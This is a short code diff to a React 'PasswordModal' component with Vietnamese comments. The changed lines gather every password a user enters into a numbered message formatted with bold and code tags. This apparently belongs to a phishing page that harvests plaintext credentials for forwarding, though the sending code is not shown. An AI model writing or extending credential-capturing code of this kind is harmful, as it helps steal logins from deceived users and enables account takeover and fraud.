@@ -57,12 +57,12 @@ const PasswordModal = ({ nextStep }) => {
             
             // Thêm tất cả passwords đã có (số thứ tự từ 1 đến passwords.length)
             passwords.forEach((pwd, index) => {
-                updatedMessage += `\n🔑 Password ${index + 1}: ${pwd}`;
+                updatedMessage += `\n🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`;
             });
             
             // Thêm password mới (số thứ tự = passwords.length + 1)
             const passwordNumber = passwords.length + 1;
-            updatedMessage += `\n🔑 Password ${passwordNumber}: ${password}`;
+            updatedMessage += `\n🔑 <b>Password ${passwordNumber}:</b> <code>${password}</code>`;
             
             // Thêm password mới vào store sau khi rebuild message
             addPassword(password);
